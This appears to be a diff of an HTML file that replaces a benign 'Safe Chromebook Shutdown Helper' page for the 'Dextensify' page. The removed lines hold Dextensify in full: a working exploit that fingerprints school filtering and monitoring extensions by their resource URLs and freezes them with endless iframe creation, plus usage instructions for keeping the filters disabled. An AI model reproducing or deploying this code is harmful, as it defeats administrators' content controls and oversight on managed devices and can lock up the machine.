@@ -1,290 +1,151 @@
-<!DOCTYPE html>
-<html lang="en"><head>
-<meta http-equiv="content-type" content="text/html; charset=UTF-8">
-    <title>Dextensify</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width">
-    <style>
-      * {
-        font-family: Sans-serif;
-        color: #d4d3da;
-      }
-      a {
-        color: #6daebd;
-      }
-      a:hover {
-        color: #4f9eb0;
-      }      
-      pre, code {
-        font-family: monospace;
-        background-color: #1e2324;
-        padding: 4px;
-        overflow-x: auto;
-      }
-      pre {
-        padding: 8px;
-      }
-      pre code {
-        background-color: transparent;
-        border: none;
-        padding: 0px;
-      }
-      body {
-        background-color: #1e2324;
-        width: 100%;
-        height: 100%;
-        margin: 0px;
-      }
-      button {
-        background-color: #33626c;
-        padding: 6px;
-        padding-left: 8px;
-        padding-right: 8px;
-        border: transparent;
-        font-size: 15px;
-      }
-      #main_div {
-        max-width: 800px;
-        object-fit: contain;
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Safe Chromebook Shutdown Helper</title>
+  <style>
+    :root{
+      --bg:#0f1724; --card:#0b1220; --accent:#6ee7b7; --muted:#9aa6b2;
+      font-family:Inter,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;
+    }
+    body{background:linear-gradient(180deg,#061022,#071227);color:#e6eef6;margin:0;padding:32px;display:flex;align-items:center;justify-content:center;min-height:100vh}
+    .card{width:100%;max-width:820px;background:var(--card);border-radius:14px;padding:28px;box-shadow:0 8px 30px rgba(2,6,23,.6)}
+    h1{margin:0 0 6px;font-size:20px}
+    p.lead{margin:0 0 18px;color:var(--muted)}
+    .grid{display:grid;grid-template-columns:1fr 320px;gap:18px}
+    .box{background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);padding:18px;border-radius:10px}
+    button{background:var(--accent);border:0;padding:10px 12px;border-radius:8px;color:#012018;font-weight:600;cursor:pointer}
+    .muted{color:var(--muted);font-size:14px}
+    code{background:#051018;padding:4px 6px;border-radius:6px;color:#c8f7e6}
+    .foot{margin-top:14px;color:var(--muted);font-size:13px}
+    .danger{background:#3b1820;color:#ffd6d6;padding:8px;border-radius:8px}
+    .hidden{display:none}
+  </style>
+</head>
+<body>
+  <div class="card" role="main">
+    <h1>Safe Chromebook Shutdown Helper</h1>
+    <p class="lead">A safe guide and utility page. This page <strong>cannot</strong> force your Chromebook to power off — modern browsers prevent web pages from doing system-level operations. Use the buttons below to get clear steps and tools you can click or copy.</p>
 
-        background-color: #252b2d;
+    <div class="grid">
+      <div class="box">
+        <h2>Detected device</h2>
+        <p id="ua" class="muted">Detecting…</p>
 
-        padding: 4px;
-        padding-left: 16px;
-        padding-right: 16px;
-        
-        margin: 16px;
-        margin-left: auto;
-        margin-right: auto;
-      }
-      #buttons_container {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 8px;
-      }
-    </style>
-    <script>
-      let from_id = id => document.getElementById(id);
-      let extensions = {
-        "securly_new": {
-          name: "Securly",
-          url: "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css"
-        },
-        "securly_old": {
-          name: "Securly (old)",
-          url: "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css"
-        },
-        "goguardian": {
-          name: "Goguardian",
-          url: "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js"
-        },
-        "lanschool": {
-          name: "LANSchool",
-          url: "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html"
-        },
-        "linewize": {
-          name: "Linewize",
-          url: "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html"
-        },
-        "blocksi": {
-          name: "Blocksi",
-          url: "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html"
-        },
-        "fortiguard": {
-          name: "Fortiguard",
-          url: "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js"
-        },
-        "cisco": {
-          name: "Cisco Umbrella",
-          url: "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html"
-        },
-        "contentkeeper": {
-          name: "ContentKeeper",
-          url: "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png"
-        },
-        "securlyclassroom": {
-          name: "Securly Classroom",
-          url: "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html"
-        },
-        "hapara": {
-          name: "Hapara",
-          url: "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html"
-        },
-        "iboss": {
-          name: "iboss",
-          url: "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html"
-        },
-        "lighspeed": {
-          name: "Lightspeed",
-          url: "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png"
-        },
-        "interclass": {
-          name: "InterCLASS Filtering Service",
-          url: "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html"
-        },
-        "intersafe": {
-          name: "InterSafe GatewayConnection Agent",
-          url: "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js"
-        },
-        "gopher_buddy": {
-          name: "Gopher Buddy",
-          url: "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png"
-        },
-        "lanschool_helper": {
-          name: "LanSchool Web Helper",
-          url: "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html"
-        },
-        "imtlazarus": {
-          name: "IMTLazarus",
-          url: "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json"
-        },
-        "impero_backdrop": {
-          name: "Impero Backdrop",
-          url: "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html"
-        },
-        "mobile_guardian": {
-          name: "Mobile Guardian",
-          url: "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html"
-        },
-      };
+        <h3 style="margin-top:14px">Quick safe options</h3>
+        <p class="muted">Follow these first — they won't harm performance.</p>
+        <ul>
+          <li class="muted">Click the status tray (bottom-right) → Power / Shut down</li>
+          <li class="muted">Press and hold the Chromebook power button for ~1–3s and choose Power off</li>
+          <li class="muted">If the device is frozen: hold the power button for ~10s to force shutdown (last resort)</li>
+        </ul>
 
-      async function check_url(url) {
-        let controller = new AbortController();
-        let timeout = setTimeout(() => controller.abort(), 500);
+        <div style="margin-top:12px">
+          <button id="copySteps">Copy steps to clipboard</button>
+          <span style="margin-left:8px" id="copied" class="muted hidden">Copied ✓</span>
+        </div>
 
-        try {
-          await fetch(url, {signal: controller.signal});
-          return true;
-        }
-        catch (error) {
-          let error_msg = error+"";
-          return error_msg.includes("AbortError");
-        }
-      }
-      
-      async function detect_extensions() {
-        let detected = [];
-        for (let extension of Object.values(extensions)) {
-          let exists = await check_url(extension.url);
-          if (exists) {
-            detected.push(extension);
-          }
-        }
-        return detected;
-      }
+        <div style="margin-top:12px">
+          <button id="tryRestart">Try restart browser (may be blocked)</button>
+          <div id="restartResult" class="muted foot"></div>
+        </div>
 
-      async function main() {
-        let detected = await detect_extensions();
-        let buttons_container = from_id("buttons_container")
+        <div style="margin-top:14px">
+          <button id="downloadGuide">Download printable guide (HTML)</button>
+        </div>
 
-        if (!window.chrome) {
-          buttons_container.innerHTML = `<p><b>Error: You are not running a Chromium-based browser.</b></p>`;
-          return;
-        }
-        else if (detected.length === 0) {
-          buttons_container.innerHTML = `<p><b>Error: No supported extensions detected.</b></p>`;
-          buttons_container.innerHTML += `<p style="margin-top: -16px;">If you want support for a specific extension added, please make an issue on the <a href="https://github.com/ading2210/dextensify">Github repository</a>, and provide the extension ID and manifest.</p>`;
-          return;
-        }
-        else {
-          buttons_container.innerHTML = ""
-        }
+        <p class="foot">Note: This page is intentionally non-privileged. It only helps you perform an action you must confirm on-device.</p>
+      </div>
 
-        for (let extension of detected) {
-          let button = document.createElement("button");
-          button.innerText = `Freeze ${extension.name}`;
-          button.onclick = () => {
-            button_handler(extension);
-          }
-          buttons_container.append(button);
-        }
-      }
+      <div class="box">
+        <h2>Guided steps for ChromeOS</h2>
+        <div id="chromeosSteps" class="">
+          <ol>
+            <li>Click the time in the bottom-right corner to open the status tray.</li>
+            <li>Click the power icon (or the <em>Power</em> / <em>Shut down</em> entry).</li>
+            <li>If your screen is frozen: press and hold the power button ~10 seconds to force power off.</li>
+            <li>After power off, wait 5–10s, then press the power button to turn on again.</li>
+          </ol>
+        </div>
 
-      function button_handler(extension) {
-        let cancel = !confirm("After hitting OK, there will be a 5 second delay until the extension starts being frozen. Switch to another tab immediately to prevent the entire device from locking up.");
-        if (cancel) return;
-        
-        setTimeout(() => {
-          create_iframes(extension);
-        }, 5000);
-      }
+        <div id="otherSteps" class="hidden">
+          <p class="muted">If you're not on ChromeOS, follow your OS's normal shutdown flow (Start menu / Apple menu / system tray).</p>
+        </div>
 
-      function create_iframes(extension) {
-        let iframes = []
-        let iterations = 5;
-        let public_url = extension.url;
-        
-        while (true) {
-          let iframe = document.createElement("iframe");
-          document.body.append(iframe);
-          iframes.push(iframe);
+        <h3 style="margin-top:12px">Developer mode & crosh (informational)</h3>
+        <p class="muted">If you're in developer mode and using the terminal (crosh) you can run commands locally — this page will not provide commands that bypass device protections. Always be cautious: developer mode reduces security.</p>
 
-          //let subframe_count = Math.max(2, 200 - iterations);
-          for (let i=0; i<50; i++) {
-            let subframe = document.createElement("iframe");
-            subframe.src = public_url;
-            subframe.style.width = subframe.style.height = "1px";
-            iframe.contentDocument.body.append(subframe);
-          }
-
-          while (iframes.length > Math.max(3, 10-iterations)) {
-            iframes[0].remove();
-            iframes.shift();
-          }
-
-          iterations++;
-        }
-      }
-
-      window.onload = main;
-    </script>
-  </head>
-  <body data-new-gr-c-s-check-loaded="8.908.0" data-gr-ext-installed="">
-    <div id="main_div">
-      <h1 style="margin-top: 8px">Dextensify</h1>
-      <p>Dextensify is an exploit which lets you disable most admin-installed Chrome extensions from any webpage.</p>
-      <h2>Instructions</h2>
-      <ol>
-        <li>Open chrome://extensions in a new tab. Keep this page open.</li>
-        <li>Go to the settings page for the extension you want to disable.</li>
-        <li>On the Dextensify page, click the "freeze extension" button. Immediately switch back to the chrome://extensions tab.</li>
-        <li>Back on the chrome://extensions page, spam the "allow access to file URLs" switch for a few seconds.</li>
-        <li>The extension should now be temporarily disabled. For this 
-effect to persist, flip the "allow access to file URLs" again every few 
-minutes, or if pages start getting blocked again.</li>
-        <li>You may also need to reopen this page every once in a while to prevent an unavoidable memory leak from crashing the system.</li>
-      </ol>
-      <p>During this process, your Chromebook may hang momentarily. This is normal, and it should resolve itself after a few seconds.</p>
-      <div id="buttons_container"><p><b>Error: You are not running a Chromium-based browser.</b></p></div>
-      <br>
-      <hr>
-      <details>
-        <summary style="margin-bottom: 8px;">
-          Made by <a href="https://ading.dev/" target="_blank">ading2210</a>. This file is licensed under the MIT license.
-        </summary>
-        <pre>MIT License
-Copyright (c) 2023 ading2210
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.</pre>
-        <p style="font-size: 13px; text-align: right;"><i>Version 1.1.1</i></p>
-      </details>
+        <div style="margin-top:12px" class="danger">
+          <strong>Security reminder:</strong> Web pages cannot safely or legitimately perform power operations on your device. Only use trusted local controls.
+        </div>
+      </div>
     </div>
-  
+  </div>
 
-</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
+  <script>
+    // Show user agent and detect ChromeOS
+    const uaEl = document.getElementById('ua');
+    const ua = navigator.userAgent || navigator.vendor || window.opera;
+    uaEl.textContent = ua;
+
+    const isChromeOS = /CrOS/i.test(ua) || /Chrome OS/i.test(ua) || /CrOS/.test(ua);
+    document.getElementById('chromeosSteps').style.display = isChromeOS ? 'block' : 'none';
+    document.getElementById('otherSteps').style.display = isChromeOS ? 'none' : 'block';
+
+    // Copy to clipboard
+    document.getElementById('copySteps').addEventListener('click', async () => {
+      const text = isChromeOS
+        ? `Chromebook shutdown steps:\n1) Click the time at bottom-right → Power → Shut down.\n2) Or press and hold the power button and choose Power off.\n3) If frozen, hold power ~10s to force off.`
+        : `Shutdown steps for your system: use system menu or power button.`;
+      try {
+        await navigator.clipboard.writeText(text);
+        const el = document.getElementById('copied');
+        el.classList.remove('hidden');
+        setTimeout(()=>el.classList.add('hidden'),2000);
+      } catch(e){
+        alert('Could not copy automatically. Select the text below and copy manually:\n\n'+text);
+      }
+    });
+
+    // Try to restart browser (best-effort). Browsers will likely block chrome:// navigation.
+    document.getElementById('tryRestart').addEventListener('click', () => {
+      const out = document.getElementById('restartResult');
+      out.textContent = 'Attempting to open browser restart...';
+      try {
+        // Some browsers block navigation to chrome://*; this is a best-effort attempt.
+        location.href = 'chrome://restart';
+        // If navigation is blocked, show fallback after a short timeout
+        setTimeout(()=>{ out.textContent = 'If nothing happened, your browser blocked the attempt. Use the status tray or power button as instructed.'; },1200);
+      } catch(err){
+        out.textContent = 'Browser prevented automatic restart. Use the on-device Power menu instead.';
+      }
+    });
+
+    // Download printable guide as HTML file
+    document.getElementById('downloadGuide').addEventListener('click', () => {
+      const guide = `
+<html><head><meta charset="utf-8"><title>Shutdown Guide</title>
+<style>body{font-family:Arial,Helvetica,sans-serif;margin:24px;color:#111}h1{color:#111}</style></head><body>
+<h1>Chromebook Shutdown Guide</h1>
+<ol>
+<li>Click the time in the bottom-right corner → select Power / Shut down.</li>
+<li>Or press and hold the physical power button and choose Power off.</li>
+<li>If the device is completely unresponsive, hold the power button ~10 seconds to force power off (last resort).</li>
+<li>Wait 5–10 seconds, then press the power button to power on.</li>
+</ol>
+<p>Note: This file is informational. Web pages cannot forcibly power off your device.</p>
+</body></html>`;
+      const blob = new Blob([guide], {type:'text/html'});
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'chromebook-shutdown-guide.html';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      setTimeout(()=>URL.revokeObjectURL(url),3000);
+    });
+  </script>
+</body>
+</html>
